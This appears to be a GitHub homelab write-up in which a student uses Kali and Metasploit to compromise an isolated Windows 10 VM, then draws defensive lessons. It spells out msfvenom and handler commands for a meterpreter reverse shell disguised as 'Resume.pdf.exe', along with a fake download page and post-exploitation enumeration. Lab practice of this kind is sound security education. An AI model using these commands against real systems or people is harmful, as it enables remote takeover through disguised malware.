# Metasploit Homelab

### Objective

- **Build a controlled offensive security lab to simulate a complete malware attack chain**, including reconnaissance, payload generation, delivery, execution, and post-exploitation, using Metasploit and a Windows 10 victim machine.

- **Demonstrate how attackers gain remote access through reverse shells and insecure configurations** such as open ports or disabled protections.

- **Strengthen understanding of real-world red team tactics** by performing an end-to-end exploitation workflow inside a safe, isolated environment.

### Skills Learned

- **Metasploit Utilization:** Leveraged Metasploit to host a malicious payload, deliver it to the victim, and establish a reverse shell to demonstrate how red teams use offensive tooling during engagements.

- **Red Team Cyber Kill Chain Framework Practice:** Followed a structured sequence mirroring real-world operations, including reconnaissance, weaponization, delivery, exploitation, installation, command & control, and post-exploitation enumeration.

- **Reverse Shell Execution & Control:** Successfully executed a reverse shell from the victim machine, enabling remote command execution and demonstrating how attackers maintain persistent access.

### Tools Used

- Kali Linux VM
- Windows 10 VM
- Nmap
- Metasploit

### Findings

- **Endpoint security controls are essential for preventing compromise**, demonstrated when disabling Windows Defender allowed the Trojan executable to run, establish persistence, and create a remote Meterpreter session without any resistance.

- **User behavior remains one of the most critical security factors**, as downloading a file disguised as “Resume.pdf.exe” was enough to initiate a full compromise. This reinforces the importance of ongoing user-security training, phishing awareness, and careful inspection of downloaded files.

- **Once initial access is gained, post-exploitation becomes far more dangerous**, with simple built-in commands exposing user accounts, groups, and network information that can support privilege escalation.

- **The lab demonstrated how quickly attackers can blend into normal system behavior**, reinforcing the need for strong logging, endpoint monitoring, and restrictive network policies.

- **Process monitoring is critical**, as the malicious file appeared as a background process that could easily be overlooked without tools like Task Manager or EDR visibility.

***

**1. Windows 10 VM / Victim: Open Port 3389 (RDP) on Victim Machine**

I created an inbound rule opening port 3389 within my internal network in order to simulate Metasploit's Meterpreter reverse shell malware.
   
<img width="1022" height="767" alt="1" src="https://github.com/user-attachments/assets/f089786c-9076-4647-9c6c-26b475c80f4f" />
<img width="1022" height="766" alt="1 1" src="https://github.com/user-attachments/assets/bdddf111-237e-427e-8b5f-532ab82562a3" />
<img width="1023" height="767" alt="1 2" src="https://github.com/user-attachments/assets/1dc8632c-17a5-4f76-99e3-63032b1282a8" />
<img width="1021" height="767" alt="1 3" src="https://github.com/user-attachments/assets/c082238b-3cae-4a7d-b618-162622d29dd3" />
<img width="1024" height="767" alt="1 4" src="https://github.com/user-attachments/assets/ba784d9b-37d7-45b2-8f8a-db05c898339c" />
<img width="1023" height="767" alt="1 5" src="https://github.com/user-attachments/assets/39e5cfd9-6b0a-483e-9eec-45e22347558e" />
<img width="1022" height="767" alt="1 6" src="https://github.com/user-attachments/assets/12b5082f-1695-46fd-a549-bbcd54cf4c98" />

***

**2. Kali Linux VM / Attacker: Conduct Reconnaissance on the Victim Machine and Prepare Payload**

I opened Command Prompt to scan the victim machine's ports and download my payload from Metasploit's msfvenom tool.
  
Entered `ifconfig` to check my Kali Linux VM / Attacker's IP address.
  
Entered `nmap -A 192.168.20.10 -Pn` to scan all the ports of my Windows 10 VM / Victim to identify if any are open.
  
Entered `msfvenom -l payloads` to list the available malware or payloads to use

Entered `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe` to essentially download Meterpreter's reverse tcp malware into a file called Resume.pdf.exe (We name it this so the file can normally appear as "Resume.pdf" to trick the victim, with "Resume.pdf.exe" only appearing if the victim manually shows file extensions).

<img width="1277" height="798" alt="2" src="https://github.com/user-attachments/assets/5863d89c-d98a-4bb0-b770-53eb35d42ab0" />
<img width="1278" height="800" alt="2 1" src="https://github.com/user-attachments/assets/79d93e04-bed0-401f-b00c-865e2aca24aa" />
<img width="1278" height="797" alt="2 2" src="https://github.com/user-attachments/assets/6f2470ea-e6e8-4349-8950-f408550c76f8" />
<img width="1279" height="798" alt="2 3" src="https://github.com/user-attachments/assets/17d1e48c-cce0-4bd8-a644-412ad4f58da1" />

***

**3. Kali Linux VM / Attacker: Metasploit Listener & Malware Delivery Setup**

Entered `msfconsole` to launch the Metasploit Framework.

Entered `use exploit/multi/handler` to configure a listener that will catch the reverse shell from the victim machine.

Entered `options` to view the current Metasploit module settings.

Entered `set payload windows/x64/meterpreter/reverse_tcp` to define the payload type we want the target to execute.

Entered `set lhost 192.168.20.11` to set our Kali machine as the callback address for the reverse connection.

Entered `exploit` to start the listener so it waits for incoming sessions.

Entered `python3 -m http.server 9999` in a separate command terminal to create a site where our victim would download our Trojan file. (This simulates a phishing landing page that tricks users into downloading malware).

<img width="1279" height="798" alt="3" src="https://github.com/user-attachments/assets/4aeab2b5-7e0a-4a88-8609-f9996023bbfa" />
<img width="1277" height="797" alt="3 1" src="https://github.com/user-attachments/assets/b2f34738-8383-4867-93ac-4d4c3eb46f69" />
<img width="1278" height="799" alt="3 2" src="https://github.com/user-attachments/assets/c4e07017-a311-4bf9-9356-150c83793e5d" />
<img width="1278" height="798" alt="3 3" src="https://github.com/user-attachments/assets/9fd4a20b-3e62-4a91-a124-93cd9a1623e5" />
<img width="1277" height="797" alt="3 4" src="https://github.com/user-attachments/assets/d0113153-0500-458e-aad0-5dd5d1423c70" />
<img width="1279" height="798" alt="3 5" src="https://github.com/user-attachments/assets/c9426917-4197-4fc8-accf-25c0e8a9c1ec" />

***

**4. Windows 10 VM / Victim: Malware Execution Simulation**

I disabled Windows Defender's Real-Time protection to be able to download the Trojan file for homelab demonstration.

Downloaded and executed the Trojan file (In a real-world scenario, malware distribution is far less obvious. This simplified version is only for controlled lab testing.).

<img width="1023" height="768" alt="4" src="https://github.com/user-attachments/assets/b4f6d1d1-a5dd-476b-a0d9-123240f4c90d" />
<img width="1041" height="837" alt="4 1" src="https://github.com/user-attachments/assets/3cf41837-f49e-45b7-b072-d63635180673" />
<img width="1024" height="767" alt="4 2" src="https://github.com/user-attachments/assets/a7e7d967-c5d7-47d7-bec6-4965b1901b69" />
<img width="1025" height="769" alt="4 3" src="https://github.com/user-attachments/assets/514b07bb-85fa-4adb-9919-9bde97ed96f7" />
<img width="1022" height="767" alt="4 4" src="https://github.com/user-attachments/assets/ea47ea9b-ecfe-4bbe-9085-83b8243d5aab" />
<img width="1022" height="766" alt="4 5" src="https://github.com/user-attachments/assets/3cd5ca6e-60ed-420f-9598-e430eb751a41" />
<img width="1022" height="768" alt="4 6" src="https://github.com/user-attachments/assets/2dc58a1b-6b4d-485d-bf28-f2f4b046df2f" />
<img width="1022" height="766" alt="4 7" src="https://github.com/user-attachments/assets/bc94524a-0e59-44a7-9d00-5db3c815edf6" />

***

**5. Windows 10 VM / Victim: Verifying the Malware Connection**

I opened Command Prompt as Administrator and entered `netstat -anob` to verify that the resume.pdf.exe Trojan successfully established a reverse connection back to the Kali Linux VM / Attacker machine.

I opened Task Manager to confirm that resume.pdf.exe was running in the background as an active process.

<img width="1022" height="767" alt="5" src="https://github.com/user-attachments/assets/3397e9b2-271e-4d60-b6d2-48cf5f9731d7" />
<img width="1021" height="766" alt="5 1" src="https://github.com/user-attachments/assets/01b8b941-cfb5-4d07-b208-7971d209ad4f" />
<img width="1023" height="767" alt="5 2" src="https://github.com/user-attachments/assets/43237d0d-9cc5-4a0e-ae47-dce0b3044b0b" />
<img width="1022" height="766" alt="5 3" src="https://github.com/user-attachments/assets/b58490b1-de8e-48ac-a268-75c0b10b7ff1" />

***

**6. Kali Linux VM / Attacker: Post-Exploitation Enumeration**

Entered 'shell' to establish a shell on the Windows 10 VM / Victim's machine.

Entered `net user` to list the Windows 10 VM / Victim's local user accounts.

Entered `net localgroup` to list the Windows 10 VM / Victim's local security groups.

Entered `ipconfig` to list the Windows 10 VM / Victim's network adapter information.

With the reverse shell established, we successfully demonstrated a red-team style post-exploitation scenario over port 3389 (RDP). At this point the attacker could perform additional actions such as privilege escalation, credential harvesting, lateral movement, or establish persistence. Through this homelab we have illustrated the risks of unmanaged malware execution in a simulated environment.

<img width="1275" height="798" alt="6" src="https://github.com/user-attachments/assets/e66c77f1-baa9-43c2-97c9-20471f6ae169" />
<img width="1278" height="798" alt="6 1" src="https://github.com/user-attachments/assets/3f524e54-167a-4d35-9201-c62a62d48aa6" />
<img width="1278" height="798" alt="6 2" src="https://github.com/user-attachments/assets/854756d9-7e13-4f83-a20f-e7bbb9040561" />
<img width="1279" height="799" alt="6 3" src="https://github.com/user-attachments/assets/2d255c80-6535-4cc2-81e7-823b2d0293ed" />

***

